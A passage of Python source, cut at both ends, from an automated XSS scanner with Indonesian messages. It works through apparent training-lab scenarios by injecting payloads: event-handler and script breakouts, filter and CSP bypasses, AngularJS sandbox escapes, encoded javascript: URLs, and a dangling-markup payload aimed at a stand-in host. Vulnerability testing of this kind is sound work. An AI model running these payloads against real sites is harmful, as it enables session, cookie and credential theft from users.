                if getattr(r,'ok',False) and r.text:
                    t = r.text; blocks.append((src, t[:350000] if len(t)>350000 else t))
            except Exception: pass
        self._dom_cache = blocks; return blocks

    def _dom_evidence(self, source_res, sink_res, proximity=700):
        hits = []
        for url, js in self._dom_blocks():
            if not any(re.search(r, js, re.I) for r in source_res): continue
            if not any(re.search(r, js, re.I) for r in sink_res): continue
            found = False
            for sm in re.finditer("|".join(source_res), js, re.I):
                win = js[max(0,sm.start()-100): sm.start()+proximity]
                if any(re.search(r, win, re.I) for r in sink_res):
                    hits.append((url, win[:200].replace("\n"," ").replace("\r"," "))); found=True; break
            if not found:
                hits.append((url, js[:180].replace("\n"," ")))
        return hits

    def _angular_scopes(self):
        scopes = []
        for page in self.pages:
            body = page.text or ""
            for m in re.finditer(r"<([a-zA-Z][\w-]*)[^>]*\b(?:data-)?ng-app\b[^>]*>", body):
                tag = m.group(1).lower(); end = body.lower().find("</"+tag, m.end())
                scopes.append((page.url, m.end(), end if end!=-1 else len(body)))
        return scopes

    def _angular_present(self):
        if self._angular_scopes(): return True
        for page in self.pages:
            if re.search(r"angular(?:\.min)?\.js|ng-app|ng-bind|ng-controller|ng-repeat", page.text or "", re.I): return True
        return False

    def _tag_allowed(self, point, tag):
        ck = (point.key, tag.lower())
        if ck in self._tag_cache: return self._tag_cache[ck]
        marker = _random_token(); payload = f"<{tag} data-sx={marker}>z</{tag}>"
        body, _ = self._send(point, payload)
        allowed = bool(body and re.search(r"<\s*"+re.escape(tag)+r"\b[^>]*"+re.escape(marker), body, re.I))
        self._tag_cache[ck] = allowed; return allowed

    def _handler_in_tag(self, body, marker, handler):
        for m in re.finditer(re.escape(marker), body):
            s = body.rfind("<", 0, m.start()); e = body.find(">", m.start())
            region = body[s:e+1] if s!=-1 and e!=-1 else body[max(0,m.start()-150):m.start()+100]
            if re.search(r"\b"+re.escape(handler)+r"\s*=", region, re.I) and re.search(r"alert\s*\(", region, re.I):
                return True, region
        return False, ""


    # ==================== LAB 01-15 ====================
    def _lab_01(self):
        # Reflected XSS into HTML context with nothing encoded
        for build in [lambda m: f"<script>alert('{m}')</script>",
                      lambda m: f"<img src=x onerror=alert('{m}')>",
                      lambda m: f"<svg onload=alert('{m}')>",
                      lambda m: f"\"><script>alert('{m}')</script>",
                      lambda m: f"\"><img src=x onerror=alert('{m}')>"]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for ctx in _analyze_reflection(body, payload, marker):
                    if not ctx.get("exact") or ctx.get("in_comment") or ctx.get("in_tag") or ctx.get("in_script"):
                        continue
                    if ctx.get("parent_tag") in _NON_EXEC_TEXT: continue
                    ok_tag = False
                    if "<script" in payload.lower():
                        ok_tag = bool(re.search(r"<script[^>]*>[^<]*alert\s*\(\s*['\"]?"+re.escape(marker), body, re.I))
                    elif "onerror=" in payload:
                        ok_tag = self._handler_in_tag(body, marker, "onerror")[0]
                    elif "onload=" in payload:
                        ok_tag = self._handler_in_tag(body, marker, "onload")[0]
                    if ok_tag and self._claim(1, point.key, "html"):
                        return self._yes(f"XSS reflected terkonfirmasi (HTML context, tanpa encoding) di {meta.get('url')} ({meta.get('point')}).", {**meta, "context":"html_text"})
        return self._no("Tidak ditemukan reflected XSS pada konteks HTML tanpa encoding.")

    def _lab_02(self):
        # Stored XSS into HTML context with nothing encoded
        def chk(body, payload, marker):
            if re.search(r"<script[^>]*>[^<]*"+re.escape(marker), body, re.I): return True
            if self._handler_in_tag(body, marker, "onerror")[0] or self._handler_in_tag(body, marker, "onload")[0]: return True
            for ctx in _analyze_reflection(body, payload, marker):
                if ctx.get("exact") and not ctx.get("in_tag") and not ctx.get("in_script") and not ctx.get("in_comment"):
                    if ctx.get("parent_tag") not in _NON_EXEC_TEXT and ("<img" in payload or "<svg" in payload): return True
            return False
        for pb in [lambda m: f"<img src=x onerror=alert('{m}')>", lambda m: f"<svg onload=alert('{m}')>"]:
            ok, ev, det = self._stored_check(pb, chk)
            if ok and self._claim(2, str(det.get("point")), "stored_html"): return self._yes(ev, det)
        return self._no("Tidak ada bukti stored XSS pada konteks HTML.")

    def _lab_03(self):
        # DOM XSS: document.write, location.search source
        hits = self._dom_evidence(
            [r"location\.search", r"location\.href", r"document\.URL", r"document\.documentURI", r"new\s+URLSearchParams", r"\.searchParams"],
            [r"document\.write\s*\(", r"document\.writeln\s*\("], proximity=800)
        for url, snip in hits:
            if re.search(r"<select\b", snip, re.I): continue
            if self._claim(3, url, "dw"): return self._yes(f"DOM XSS (source URL -> document.write) terindikasi di {url}.", {"url":url,"sink":"document.write","source":"location","snippet":snip})
        return self._no("Tidak ditemukan alur source URL -> document.write.")

    def _lab_04(self):
        # DOM XSS: innerHTML, location.search source
        hits = self._dom_evidence(
            [r"location\.search", r"location\.href", r"document\.URL", r"URLSearchParams", r"\.searchParams"],
            [r"\.innerHTML\s*[+=]", r"\.outerHTML\s*[+=]", r"insertAdjacentHTML\s*\("], proximity=800)
        for url, snip in hits:
            if self._claim(4, url, "ih"): return self._yes(f"DOM XSS (source URL -> innerHTML/outerHTML) terindikasi di {url}.", {"url":url,"sink":"innerHTML","source":"location","snippet":snip})
        return self._no("Tidak ditemukan alur source URL -> innerHTML.")

    def _lab_05(self):
        # DOM XSS: jQuery href, location.search source
        hits = self._dom_evidence(
            [r"location\.search", r"location\.href", r"URLSearchParams"],
            [r"\.attr\s*\(\s*['\"]href['\"]", r"\.prop\s*\(\s*['\"]href['\"]"], proximity=800)
        for url, snip in hits:
            if self._claim(5, url, "href"): return self._yes(f"DOM XSS (source URL -> jQuery href) terindikasi di {url}.", {"url":url,"sink":"$.attr(href)","source":"location.search","snippet":snip})
        # fallback: direct href assignment with URL source
        hits2 = self._dom_evidence([r"location\.search", r"URLSearchParams"], [r"\.href\s*="], proximity=500)
        for url, snip in hits2:
            if re.search(r"\$\(|jQuery|attr", snip, re.I) and self._claim(5, url, "href2"):
                return self._yes(f"DOM XSS (source URL -> href) terindikasi di {url}.", {"url":url,"sink":"href","snippet":snip})
        return self._no("Tidak ditemukan alur source URL -> href (jQuery/DOM).")

    def _lab_06(self):
        # DOM XSS: jQuery selector sink using hashchange
        for url, js in self._dom_blocks():
            if not re.search(r"hashchange|onhashchange", js, re.I): continue
            if not re.search(r"\$\(|jQuery", js): continue
            # $(location.hash) or $(hash) pattern near hashchange/location.hash
            if re.search(r"\$\s*\(\s*(?:location\.hash|[^)]*\bhash\b[^)]*)\s*\)", js, re.I) or \
               re.search(r"location\.hash[\s\S]{0,300}\$\s*\(", js, re.I):
                snip = ""
                for m in re.finditer(r"\$\s*\([^)]*(?:hash|location)[^)]*\)", js, re.I): snip = m.group(0)[:180]; break
                if not snip:
                    for m in re.finditer(r"hashchange[\s\S]{0,200}", js, re.I): snip = m.group(0)[:180].replace("\n"," "); break
                if self._claim(6, url, "jqhash"): return self._yes(f"DOM XSS (location.hash/hashchange -> jQuery selector) terindikasi di {url}.", {"url":url,"sink":"$(...)","source":"location.hash","snippet":snip})
        return self._no("Tidak ditemukan alur location.hash/hashchange -> jQuery selector.")

    def _lab_07(self):
        # Reflected XSS into attribute with angle brackets HTML-encoded
        for build, handler in [(lambda m: f'" autofocus onfocus=alert(\'{m}\') x="', "onfocus"),
                                (lambda m: f'" onmouseover=alert(\'{m}\') x="', "onmouseover"),
                                (lambda m: f"' autofocus onfocus=alert('{m}') x='", "onfocus"),
                                (lambda m: f'" accesskey=x onclick=alert(\'{m}\') x="', "onclick")]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                # Verify actual breakout: handler attribute injected into a tag
                if not self._handler_in_tag(body, marker, handler)[0]: continue
                # Check if < > were encoded in the reflection context (scenario characteristic) - informational
                enc = self._encoding_at_point(point)
                if self._claim(7, point.key, "attr"):
                    note = " (angle brackets ter-encode, kutip breakout)" if enc.get("<") in ("encoded","removed") else ""
                    return self._yes(f"Breakout atribut terkonfirmasi{note} di {meta.get('url')} ({meta.get('point')}); handler {handler} terinjeksi.", {**meta,"context":"attribute","handler":handler,"encoding":enc})
        return self._no("Tidak ditemukan breakout atribut XSS yang terkonfirmasi.")

    def _lab_08(self):
        # Stored XSS into anchor href with double quotes HTML-encoded
        def chk(body, payload, marker):
            for tag in re.findall(r"<a\b[^>]*>", body, re.I|re.S):
                if marker in tag and re.search(r"\bhref\s*=\s*['\"]?\s*javascript\s*:", tag, re.I): return True
            return False
        for pb in [lambda m: f"javascript:alert('{m}')", lambda m: f"javascript:alert(1)//{m}"]:
            ok, ev, det = self._stored_check(pb, chk)
            if ok and self._claim(8, str(det.get("point")), "href"): return self._yes(ev+" href anchor menerima javascript:.", det)
        return self._no("Tidak ada bukti stored XSS pada href anchor (javascript:).")

    def _lab_09(self):
        # Reflected XSS into JS string with angle brackets HTML encoded
        for build, pat in [(lambda m: f"'-alert('{m}')-'", r"'-alert\s*\("),
                           (lambda m: f"';alert('{m}');//", r"';alert\s*\("),
                           (lambda m: f"\"-alert('{m}')-\"", r'"-alert\s*\(')]:
            for point in self._ranked_points()[:12]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for ctx in _analyze_reflection(body, payload, marker):
                    if not ctx.get("exact") or not ctx.get("in_script"): continue
                    pos = ctx.get("pos",0)
                    seg_s = body.rfind("<script", 0, pos); seg_e = body.find(">", seg_s) if seg_s!=-1 else -1
                    seg = body[seg_e+1: pos+len(marker)+30] if seg_e!=-1 else ""
                    if re.search(pat, seg) and self._claim(9, point.key, "js"):
                        enc = self._encoding_at_point(point)
                        return self._yes(f"Breakout string JavaScript terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"js_string","encoding":enc})
        return self._no("Tidak ditemukan breakout string JavaScript yang terkonfirmasi.")

    def _lab_10(self):
        # DOM XSS: document.write into <select>, location.search source
        for url, js in self._dom_blocks():
            if not re.search(r"document\.write\s*\(", js, re.I): continue
            if not re.search(r"<select|<option|select\b", js, re.I): continue
            if not re.search(r"location\.search|location\.href|URLSearchParams|document\.URL", js, re.I): continue
            snip = ""
            for m in re.finditer(r"document\.write[\s\S]{0,220}", js, re.I):
                if re.search(r"select|option|location", m.group(0), re.I): snip = m.group(0)[:200].replace("\n"," "); break
            if self._claim(10, url, "dwsel"): return self._yes(f"DOM XSS (location.search -> document.write dalam <select>) terindikasi di {url}.", {"url":url,"sink":"document.write(select)","snippet":snip})
        return self._no("Tidak ditemukan document.write ke <select> dengan source URL.")

    def _lab_11(self):
        # DOM XSS: AngularJS expression (angle brackets/dquotes encoded context)
        if not self._angular_present(): return self._no("AngularJS tidak terdeteksi.")
        scopes = self._angular_scopes()
        for build in [lambda m: "{{constructor.constructor('alert(1)')()}}"+m,
                      lambda m: "{{$on.constructor('alert(1)')()}}"+m,
                      lambda m: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"+m]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for ctx in _analyze_reflection(body, payload, marker):
                    if not ctx.get("exact") or ctx.get("in_script"): continue
                    pos = ctx.get("pos",0)
                    in_scope = (not scopes) or any(s <= pos <= e for _,s,e in scopes)
                    if in_scope and self._claim(11, point.key, "ng"):
                        return self._yes(f"Ekspresi AngularJS ter-refleksi mentah di scope Angular pada {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"angular_expression"})
                # fallback: payload expression reflected in page that has ng-app (template injection context)
        for point in self._ranked_points()[:14]:
            if not self._lab_budget(): break
            marker = _random_token(); payload = "{{constructor.constructor('alert(1)')()}}" + marker
            body, meta = self._reflects(point, marker, payload)
            if body and "constructor.constructor" in body and re.search(r'ng-app|angular', body, re.I) and marker in body:
                if self._claim(11, point.key, "ng_fb"): return self._yes(f"Ekspresi AngularJS ter-refleksi di halaman Angular pada {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"angular_expression"})
        return self._no("Ekspresi AngularJS tidak terkonfirmasi di scope yang dievaluasi.")

    def _lab_12(self):
        # Reflected DOM XSS
        sinks = any(re.search(r"\.innerHTML|document\.write|eval\s*\(|insertAdjacentHTML|\.outerHTML|location\.href\s*=", js, re.I) for _,js in self._dom_blocks())
        for build in [lambda m: f"\"-alert('{m}')-\"", lambda m: f"'-alert('{m}')-'", lambda m: f"\\\"-alert('{m}')//", lambda m: f"</script><img src=x onerror=alert('{m}')>"]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for ctx in _analyze_reflection(body, payload, marker):
                    if not ctx.get("exact"): continue
                    if ctx.get("in_script") and self._claim(12, point.key, "rdom"):
                        pos = ctx.get("pos",0); seg_s = body.rfind("<script",0,pos); seg_e = body.find(">",seg_s) if seg_s!=-1 else -1
                        seg = body[seg_e+1: pos+len(marker)+60] if seg_e!=-1 else ""
                        if re.search(r"alert\s*\(|-alert|';alert|\"-alert", seg):
                            return self._yes(f"Reflected DOM XSS terkonfirmasi (breakout di <script>) di {meta.get('url')} ({meta.get('point')}); sink DOM terdeteksi={sinks}.", {**meta,"context":"reflected_dom","sinks":sinks})
                if "</script><img" in payload and self._handler_in_tag(body, marker, "onerror")[0] and self._claim(12, point.key, "rdom_sc"):
                    return self._yes(f"Reflected DOM/XSS terkonfirmasi (script breakout) di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"reflected_dom"})
        return self._no("Tidak ditemukan pola reflected DOM XSS yang terkonfirmasi.")

    def _lab_13(self):
        # Stored DOM XSS
        def chk(body, payload, marker):
            for ctx in _analyze_reflection(body, payload, marker):
                if ctx.get("exact") and (ctx.get("in_script") or not ctx.get("in_tag")):
                    if re.search(r"\.innerHTML|document\.write|insertAdjacentHTML|\$\(|eval\s*\(", body, re.I): return True
            return False
        for pb in [lambda m: f"'-alert('{m}')-'", lambda m: f"<img src=x onerror=alert('{m}')>"]:
            ok, ev, det = self._stored_check(pb, chk)
            if ok and self._claim(13, str(det.get("point")), "sdom"): return self._yes(ev, det)
        return self._no("Tidak ada bukti stored DOM XSS yang terkonfirmasi.")

    def _lab_14(self):
        # Reflected XSS, most tags and attributes blocked
        for point in self._ranked_points()[:14]:
            if not self._lab_budget(): break
            script_ok = self._tag_allowed(point, "script")
            # try bypass tags/handlers
            attempts = [
                ("img","onerror", lambda m: f"<img src=x onerror=alert('{m}')>"),
                ("svg","onload", lambda m: f"<svg onload=alert('{m}')>"),
                ("body","onload", lambda m: f"<body onload=alert('{m}')>"),
                ("input","onfocus", lambda m: f"<input autofocus onfocus=alert('{m}')>"),
                ("details","ontoggle", lambda m: f"<details open ontoggle=alert('{m}')>"),
                ("body","onresize", lambda m: f"<body onresize=print('{m}')>"),
                ("img","onerror", lambda m: f"<img src=1 onerror=print('{m}')>"),
            ]
            for tag, handler, build in attempts:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                if self._handler_in_tag(body, marker, handler)[0] and re.search(r"<\s*"+tag+r"\b", body, re.I):
                    if self._claim(14, point.key, f"bypass_{tag}"):
                        return self._yes(f"<script> diblokir tapi <{tag} {handler}> lolos dan ter-refleksi di {meta.get('url')} ({meta.get('point')}).", {**meta,"bypass_tag":tag,"handler":handler})
        # If we couldn't do tag_allowed checks due to budget, try direct bypass
        if not any(self._tag_cache.values()):
            for tag, handler, build in [("img","onerror", lambda m: f"<img src=x onerror=alert('{m}')>"), ("svg","onload", lambda m: f"<svg onload=alert('{m}')>")]:
                for point in self._ranked_points()[:8]:
                    if not self._lab_budget(): break
                    marker = _random_token(); payload = build(marker)
                    body, meta = self._reflects(point, marker, payload)
                    if body and self._handler_in_tag(body, marker, handler)[0] and self._claim(14, point.key, f"d_{tag}"):
                        return self._yes(f"Payload <{tag} {handler}> ter-refleksi executable di {meta.get('url')} (indikasi bypass filter tag).", {**meta,"bypass_tag":tag})
        return self._no("Tidak ada bypass filter tag yang terkonfirmasi.")

    def _lab_15(self):
        # All tags blocked except custom ones
        for point in self._ranked_points()[:8]:
            if not self._lab_budget(): break
            # check common tags blocked
            blocked = all(not self._tag_allowed(point, t) for t in ("script","img","svg","body","iframe"))
            if not blocked: continue
            for handler, build in [("onfocus", lambda m: f"<xss id=x tabindex=1 onfocus=alert('{m}')>"),
                                   ("onclick", lambda m: f"<satria onclick=alert('{m}')>x</satria>")]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if body and self._handler_in_tag(body, marker, handler)[0] and self._claim(15, point.key, "custom"):
                    return self._yes(f"Tag standar diblokir tapi custom element dengan {handler} lolos di {meta.get('url')} ({meta.get('point')}).", {**meta,"handler":handler})
        return self._no("Tidak ada custom element bypass yang terkonfirmasi.")

    # ==================== LAB 16-24 ====================
    def _lab_16(self):
        for point in self._ranked_points()[:8]:
            if not self._lab_budget(): break
            if self._tag_allowed(point, "script"): continue
            if not self._tag_allowed(point, "svg"): continue
            for handler, build in [("onbegin", lambda m: f"<svg><animateTransform onbegin=alert('{m}') attributeName=transform>"),
                                   ("onbegin", lambda m: f"<svg><animate onbegin=alert('{m}') attributeName=x dur=1s>"),
                                   ("onload", lambda m: f"<svg onload=alert('{m}')>")]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if body and self._handler_in_tag(body, marker, handler)[0] and re.search(r"<svg", body, re.I):
                    if self._claim(16, point.key, "svg"):
                        return self._yes(f"<script> diblokir tapi markup SVG dengan {handler} lolos di {meta.get('url')} ({meta.get('point')}).", {**meta,"handler":handler})
        return self._no("Tidak ada markup SVG berbahaya yang terkonfirmasi.")

    def _lab_17(self):
        for build in [lambda m: f"' accesskey='x' onclick='alert({m})' x='",
                      lambda m: f"' onclick='alert(1)//{m}' accesskey='x"]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for tag in re.findall(r"<link\b[^>]*>", body, re.I|re.S):
                    if "canonical" not in tag.lower(): continue
                    if marker in tag and re.search(r"onclick\s*=", tag, re.I):
                        if self._claim(17, point.key, "canon"):
                            return self._yes(f"Injeksi pada <link rel=canonical> terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"canonical"})
        return self._no("Tidak ditemukan injeksi pada tag canonical link.")

    def _lab_18(self):
        # JS string: sq+backslash escaped, but </script> breaks out
        for build in [lambda m: f"</script><script>alert('{m}')</script>",
                      lambda m: f"</script><img src=x onerror=alert('{m}')>"]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                if "<script" in payload.lower() and re.search(r"<script[^>]*>[^<]*alert\s*\(\s*['\"]?"+re.escape(marker), body, re.I):
                    # ensure it's a real injected script tag (exact payload reflected)
                    if payload in body or re.search(re.escape("</script>")+r"\s*<script", body, re.I):
                        if self._claim(18, point.key, "sc"):
                            return self._yes(f"Breakout </script> terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"script_breakout"})
                if "<img" in payload.lower() and self._handler_in_tag(body, marker, "onerror")[0]:
                    if self._claim(18, point.key, "scimg"):
                        return self._yes(f"Breakout </script> via <img> terkonfirmasi di {meta.get('url')}.", {**meta,"context":"script_breakout"})
        return self._no("Tidak ditemukan breakout </script> pada konteks JS string ter-escape.")

    def _lab_19(self):
        # JS string: <>" HTML-encoded, sq escaped, backslash not escaped -> \' breaks out
        for build in [lambda m: f"\\'-alert('{m}')//", lambda m: f"\\';alert('{m}');//"]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for ctx in _analyze_reflection(body, payload, marker):
                    if not ctx.get("exact") or not ctx.get("in_script"): continue
                    pos = ctx.get("pos",0)
                    seg_s = body.rfind("<script", 0, pos); seg_e = body.find(">", seg_s) if seg_s!=-1 else -1
                    seg = body[seg_e+1: pos+len(marker)+40] if seg_e!=-1 else ""
                    # look for the escape-bypass result: \' followed by breakout leading to alert
                    if "alert(" + "'" not in seg and "alert('"+marker not in seg and "alert("+marker not in seg:
                        # try looser
                        pass
                    if re.search(r"\\['\"]?\s*[-;]\s*alert\s*\(", seg) or re.search(r"alert\s*\(\s*['\"]?"+re.escape(marker), seg):
                        if self._claim(19, point.key, "bs"):
                            return self._yes(f"Breakout string JS via backslash escape terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"js_backslash_escape"})
        return self._no("Tidak ditemukan breakout JS via escape backslash.")

    def _lab_20(self):
        # Stored XSS into onclick, complex encoding
        def chk(body, payload, marker):
            for tag in re.findall(r"<[^>]+>", body, re.S):
                if marker in tag and re.search(r"\bon[a-z]+\s*=", tag, re.I) and re.search(r"alert\s*\(", tag, re.I):
                    return True
            return False
        for pb in [lambda m: f"&apos;-alert({m})-&apos;", lambda m: f"&#39;-alert({m})-&#39;",
                   lambda m: f"'-alert({m})-'"]:
            ok, ev, det = self._stored_check(pb, chk)
            if ok and self._claim(20, str(det.get("point")), "oc"): return self._yes(ev+" Payload di atribut event handler.", det)
        return self._no("Tidak ada bukti stored XSS pada onclick/event handler.")

    def _lab_21(self):
        # Reflected XSS into template literal
        for build in [lambda m: f"${{alert({m})}}", lambda m: f"${{alert('{m}')}}"]:
            for point in self._ranked_points()[:12]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for ctx in _analyze_reflection(body, payload, marker):
                    if not ctx.get("exact") or not ctx.get("in_script"): continue
                    if ctx.get("js") == "tpl" or ctx.get("in_template"):
                        if self._claim(21, point.key, "tpl"): return self._yes(f"Template literal injection terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"template_literal"})
                    pos = ctx.get("pos",0)
                    seg_s = body.rfind("<script", 0, pos); seg_e = body.find(">", seg_s) if seg_s!=-1 else -1
                    seg = body[seg_e+1: pos+len(marker)+15] if seg_e!=-1 else ""
                    bt_before = seg.rfind("`", 0, max(0,len(seg)-len(marker)-10))
                    if bt_before != -1 and "${alert(" in seg:
                        if self._claim(21, point.key, "tpl2"): return self._yes(f"Template literal injection terkonfirmasi di {meta.get('url')}.", {**meta,"context":"template_literal"})
        return self._no("Tidak ditemukan injeksi template literal yang terkonfirmasi.")

    def _exec_labs(self):
        return sorted(lid for lid in _EXECUTABLE_LAB_IDS if self._results.get(lid,{}).get("confirmed"))

    def _lab_22(self):
        deps = self._exec_labs()
        if not deps: return self._no("Belum ada XSS executable terkonfirmasi.")
        cookies = list(self._set_cookies)
        try:
            for c in self.session.cookies: cookies.append(f"{c.name}={c.value}")
        except Exception: pass
        if not cookies: return self._no("Tidak teramati cookie; klaim pencurian cookie tidak terbukti.")
        non_http = [c for c in cookies if "httponly" not in c.lower()]
        if not non_http: return self._no("Cookie teramati HttpOnly; document.cookie tidak dapat membaca.")
        return self._yes(f"XSS executable (lab {deps}) + cookie non-HttpOnly teramati: pencurian cookie dimungkinkan.", {"depends_on":deps,"impact":"cookie_theft"})

    def _lab_23(self):
        deps = self._exec_labs()
        if not deps: return self._no("Belum ada XSS executable terkonfirmasi.")
        has_pw = any(re.search(r'type\s*=\s*["\']?password', (p.text or ""), re.I) for p in self.pages) or any(f.has_password for p in self.pages for f in p.forms)
        if not has_pw: return self._no("Tidak ditemukan input password; klaim tidak terbukti.")
        return self._yes(f"XSS executable (lab {deps}) + form password terdeteksi: penangkapan kredensial dimungkinkan.", {"depends_on":deps,"impact":"password_capture"})

    def _lab_24(self):
        deps = self._exec_labs()
        if not deps: return self._no("Belum ada XSS executable terkonfirmasi.")
        has_csrf = False
        for p in self.pages:
            for f in p.forms:
                for n,_v,_t in f.fields:
                    if re.search(r"csrf|authenticity|_token|\bnonce\b|__requestverification", n, re.I): has_csrf=True
            if re.search(r'csrf|authenticity_token|_token', p.text or "", re.I): has_csrf=True
        if not has_csrf: return self._no("Tidak terdeteksi token CSRF; klaim tidak terbukti.")
        return self._yes(f"XSS executable (lab {deps}) + token CSRF terdeteksi: bypass CSRF dimungkinkan.", {"depends_on":deps,"impact":"csrf_bypass"})

    # ==================== LAB 25-30 ====================
    def _lab_25(self):
        # AngularJS sandbox escape without strings
        if not self._angular_present(): return self._no("AngularJS tidak terdeteksi.")
        scopes = self._angular_scopes()
        for build in [lambda m: "1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"+m,
                      lambda m: "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"+m]:
            for point in self._ranked_points()[:14]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                for ctx in _analyze_reflection(body, payload, marker):
                    if ctx.get("exact") and not ctx.get("in_script"):
                        pos = ctx.get("pos",0)
                        in_scope = (not scopes) or any(s<=pos<=e for _,s,e in scopes)
                        if in_scope and self._claim(25, point.key, "ngsb"):
                            return self._yes(f"Payload AngularJS sandbox escape ter-refleksi di scope Angular pada {meta.get('url')}.", {**meta,"context":"angular_sandbox"})
        return self._no("AngularJS sandbox escape tidak terkonfirmasi.")

    def _lab_26(self):
        # AngularJS sandbox escape and CSP
        if not self._csp_header: return self._no("Tidak ada header CSP; skenario tidak berlaku.")
        if not self._angular_present(): return self._no("AngularJS tidak terdeteksi.")
        scopes = self._angular_scopes()
        for build in [lambda m: "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x"+m,
                      lambda m: "<div ng-app ng-csp><input autofocus ng-focus=$event.path|orderBy:'x=alert(1)'></div>"+m]:
            for point in self._ranked_points()[:14]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                if marker in body and ("ng-focus" in body or "ng-csp" in body or "orderBy" in body):
                    for ctx in _analyze_reflection(body, payload, marker):
                        if ctx.get("exact") and self._claim(26, point.key, "ngcsp"):
                            return self._yes(f"Payload AngularJS sandbox/CSP ter-refleksi di {meta.get('url')}; CSP: {self._csp_header[:100]}.", {**meta,"csp":self._csp_header[:180]})
        return self._no("AngularJS sandbox escape + CSP tidak terkonfirmasi.")

    def _lab_27(self):
        # Event handlers and href blocked - bypass via SVG animate
        for point in self._ranked_points()[:8]:
            if not self._lab_budget(): break
            cm = _random_token()
            b1,_ = self._send(point, f"<img src=x onerror=alert('{cm}')>")
            b2,_ = self._send(point, f"<a href=\"javascript:alert('{cm}')\">x</a>")
            ev_blocked = (b1 is None) or not re.search(r"onerror\s*=\s*alert", b1 or "", re.I)
            href_blocked = (b2 is None) or not re.search(r'href\s*=\s*["\']?\s*javascript:', b2 or "", re.I)
            if not (ev_blocked or href_blocked): continue
            marker = _random_token()
            payload = f"<svg><a><animate attributeName=href values=javascript:alert('{marker}') /><text x=20 y=20>X</text></a></svg>"
            body, meta = self._reflects(point, marker, payload)
            if body and re.search(r"animate[^>]+attributeName\s*=\s*['\"]?href", body, re.I) and re.search(r"javascript\s*:", body, re.I):
                if self._claim(27, point.key, "anim"):
                    return self._yes(f"Event handler/href diblokir tapi <animate attributeName=href> lolos di {meta.get('url')} ({meta.get('point')}).", {**meta,"event_blocked":ev_blocked,"href_blocked":href_blocked})
        return self._no("Tidak ada bypass SVG animate yang terkonfirmasi.")

    def _lab_28(self):
        # JavaScript URL with some characters blocked
        for point in self._ranked_points()[:10]:
            if not self._lab_budget(): break
            for build in [lambda m: f"&#106;avascript:alert('{m}')",
                          lambda m: f"&#x6a;avascript:alert('{m}')",
                          lambda m: f"javascript&colon;alert('{m}')",
                          lambda m: f"java%09script:alert('{m}')",
                          lambda m: f"java%0ascript:alert('{m}')"]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
                if not body: continue
                # in href attribute
                for tag in re.findall(r"<a\b[^>]*>", body, re.I|re.S):
                    if marker in tag and re.search(r"alert\s*\(", tag, re.I):
                        if re.search(r"href\s*=", tag, re.I) and re.search(r"javascript|&#106;|&#x6a;|script", tag, re.I):
                            if self._claim(28, point.key, "jsurl"):
                                return self._yes(f"Varian JavaScript URL (encoded/whitespace) ter-refleksi di href pada {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"js_url"})
                for ctx in _analyze_reflection(body, payload, marker):
                    if ctx.get("in_attr") and ctx.get("attr_name")=="href" and "alert" in body[max(0,ctx.get("pos",0)-50):ctx.get("pos",0)+80]:
                        if self._claim(28, point.key, "jsurl2"):
                            return self._yes(f"Varian JavaScript URL ter-refleksi di atribut href pada {meta.get('url')}.", {**meta})
        return self._no("Tidak ada bypass JavaScript URL yang terkonfirmasi.")

    def _lab_29(self):
        # Strict CSP, dangling markup
        csp = self._csp_header
        if not csp: return self._no("Tidak ada header CSP.")
        if "'unsafe-inline'" in csp.lower(): return self._no("CSP mengizinkan unsafe-inline; bukan skenario dangling markup ketat.")
        for build in [lambda m: f'<img src="https://satria.invalid/?c={m}',
                      lambda m: f"<base href='https://satria.invalid/{m}/'>"]:
            for point in self._ranked_points()[:18]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = build(marker)
                body, meta = self._reflects(point, marker, payload)
